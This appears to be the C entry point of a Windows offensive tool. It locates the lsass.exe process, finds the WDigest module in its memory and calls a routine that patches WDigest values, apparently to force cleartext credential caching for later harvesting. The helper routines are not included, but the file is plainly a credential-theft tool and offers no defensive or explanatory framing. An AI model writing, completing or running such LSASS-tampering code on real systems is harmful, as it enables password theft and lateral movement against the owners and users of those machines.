#include "Common.h"
#include <stdio.h>

// ----------------------------------------------------------------
// Entry Point
// ----------------------------------------------------------------
INT wmain(
)
{
    HANDLE     hProcess     = NULL;
    ULONG_PTR  uWdigestBase = 0;
    INT        nStatus      = 1;

    if (!InitializeWdigestOffsets()) {
        printf("[!] InitializeWdigestOffsets failed\n");
        return FALSE;
    }

    if (!SearchProcess(L"lsass.exe", &hProcess)) {
        printf("[!] lsass.exe not found\n");
        return FALSE;
    }

    if (!FindWdigestInsideLsass(hProcess, &uWdigestBase)) {
        printf("[!] FindWdigestInsideLsass failed\n");
        goto cleanup;
    }

    if (!PatchWdigestValues(hProcess, uWdigestBase)) {
        printf("[!] PatchWdigestValues failed\n");
        goto cleanup;
    }

    nStatus = 0;

cleanup:
    // NtClose syscall
    if (!CloseHandle(hProcess)) {
        printf("[!] CloseHandle failed with error: %lu\n", GetLastError());
        return 1;
    }

    return nStatus;
}
